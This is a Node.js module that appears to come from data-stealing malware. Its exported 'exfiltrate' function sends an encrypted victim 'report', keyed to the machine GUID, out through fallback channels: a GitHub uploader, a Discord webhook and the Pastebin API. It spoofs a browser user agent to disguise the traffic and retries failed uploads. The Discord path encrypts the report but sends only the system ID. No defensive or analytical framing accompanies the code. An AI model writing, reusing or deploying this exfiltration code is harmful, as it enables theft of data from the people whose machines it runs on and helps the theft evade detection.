const logger = require("../utils/logger");
const { withRetry } = require("../utils/retry");
const { encryptAes } = require("../utils/crypto");
const { getMachineGuid } = require("../system/machineId");
const config = require("./config");
const { uploadToGitHub } = require("./uploader");

const FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";

/**
 * Try each exfil channel in order. Returns true if any succeeds.
 * @param {object} report
 * @param {string} systemId
 * @returns {Promise<boolean>}
 */
async function exfiltrate(report, systemId) {
    const channels = [
        { name: "github", fn: () => uploadToGitHub(report, systemId) },
        { name: "discord", fn: () => uploadToDiscord(report, systemId) },
        { name: "pastebin", fn: () => uploadToPastebin(report, systemId) }
    ];

    for (const { name, fn } of channels) {
        try {
            const result = await fn();
            if (result) {
                logger.info(`Exfil succeeded via ${name}`);
                return true;
            }
        } catch (err) {
            logger.warn(`Exfil ${name} failed: ${err.message}`);
        }
    }

    logger.error("All exfil channels exhausted");
    return false;
}

/**
 * Upload encrypted report via Discord webhook.
 * @param {object} report
 * @param {string} systemId
 * @returns {Promise<boolean>}
 */
async function uploadToDiscord(report, systemId) {
    const { webhook } = config.discord;
    if (!webhook) return false;

    const guid = getMachineGuid();
    const plaintext = JSON.stringify(report, null, 2);
    const encrypted = encryptAes(plaintext, guid);

    return withRetry(async ({ signal }) => {
        const response = await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": FAKE_UA
            },
            body: JSON.stringify({
                content: `\`\`\`json\n${systemId}\n\`\`\``,
                embeds: [{
                    title: "System Report",
                    description: `Report for ${systemId}`,
                    fields: [
                        { name: "System ID", value: systemId, inline: true },
                        { name: "Timestamp", value: report.timestamp || "N/A", inline: true }
                    ]
                }]
            }),
            signal
        });

        if (!response.ok) {
            const body = await response.text().catch(() => "");
            throw new Error(`Discord API ${response.status}: ${body.slice(0, 200)}`);
        }

        logger.info("Report uploaded via Discord");
        return true;
    }, { label: "Discord" });
}

/**
 * Upload encrypted report as a Pastebin paste.
 * @param {object} report
 * @param {string} systemId
 * @returns {Promise<boolean>}
 */
async function uploadToPastebin(report, systemId) {
    const { apiKey } = config.pastebin;
    if (!apiKey) return false;

    const guid = getMachineGuid();
    const plaintext = JSON.stringify(report, null, 2);
    const encrypted = encryptAes(plaintext, guid);
    const pasteContent = JSON.stringify(encrypted, null, 2);

    return withRetry(async ({ signal }) => {
        const params = new URLSearchParams({
            api_dev_key: apiKey,
            api_option: "paste",
            api_paste_code: pasteContent,
            api_paste_name: `report-${systemId}`,
            api_paste_private: "2",
            api_paste_expire_date: "1M"
        });

        const response = await fetch("https://pastebin.com/api/api_post.php", {
            method: "POST",
            headers: {
                "User-Agent": FAKE_UA,
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: params.toString(),
            signal
        });

        const text = await response.text();
        if (text.startsWith("https://pastebin.com/")) {
            logger.info(`Report uploaded via Pastebin: ${text}`);
            return true;
        }
        throw new Error(`Pastebin error: ${text.slice(0, 200)}`);
    }, { label: "Pastebin" });
}

module.exports = { exfiltrate };